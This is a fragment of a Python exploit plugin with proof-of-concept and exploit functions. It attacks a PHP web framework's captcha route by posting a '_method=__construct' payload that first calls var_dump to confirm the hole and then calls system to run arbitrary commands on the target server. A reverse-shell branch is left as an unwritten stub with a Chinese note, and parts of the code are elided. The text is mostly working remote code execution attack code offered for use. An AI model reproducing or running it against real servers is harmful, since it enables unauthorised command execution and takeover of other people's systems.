...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        rp = requests.post(url+"/index.php?s=captcha",data="_method=__construct&filter[]=var_dump&method=get&server[REQUEST_METHOD]=xiaohei",headers=heads,verify=False)
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='cmd':
            rp = requests.post(url+"/index.php?s=captcha",data="_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]="+exp_data['command'],headers=heads,verify=False)
            if  rp.text!="":
                result['Result'] = True
                result['Result_Info'] = rp.text.split("<!DOCTYPE html>")[0].strip()
        #反弹shell    
        if exp_data['type']=='shell':
            result['Result'] = False
            result['Result_Info'] = "该功能暂未编写"
        #上传文件    
